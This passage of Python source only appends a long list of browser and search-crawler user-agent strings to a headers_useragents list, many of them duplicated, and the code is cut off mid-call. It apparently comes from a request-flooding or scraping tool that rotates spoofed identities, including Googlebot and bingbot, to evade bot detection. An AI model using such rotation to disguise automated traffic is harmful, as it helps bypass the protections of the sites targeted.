    headers_useragents.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )
    headers_useragents.append(
        "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML,"
        " like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser"
        " 1.98.744; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo"
        " Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;"
        " Avant Browser)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser;"
        " GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1;"
        " .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like"
        " Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like"
        " Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML,"
        " like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
    )
    headers_useragents.append(
        "Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML,"
        " like Gecko) Version/7.0.3 Safari/7046A194A"
    )
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)"
    )
    headers_useragents.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)")
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (FM Scene 4.6.1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) "
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004"
        " Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none;"
        " freenet DSL 1.1; (none))"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie;"
        " .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like"
        " Gecko) Safari/417.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010"
        " Firefox/1.0.7 (Ubuntu package 1.0.7)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR"
        " 2.0.50727; .NET CLR 3.0.04506.30)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
    headers_useragents.append("Opera/9.20 (Windows NT 6.0; U; en)")
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205"
        " Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR"
        " 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML,"
        " like Gecko) Version/4.0 Safari/528.16"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209"
        " Firefox/3.6.13"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401"
        " Firefox/4.0 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo"
        " Firefox/3.6.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809"
        " Fedora/3.6.7-1.fc14 Firefox/3.6.7"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc"
        " dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1;"
        " WOW64; Trident/5.0; FunWebProducts)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30;"
        " .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR"
        " 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
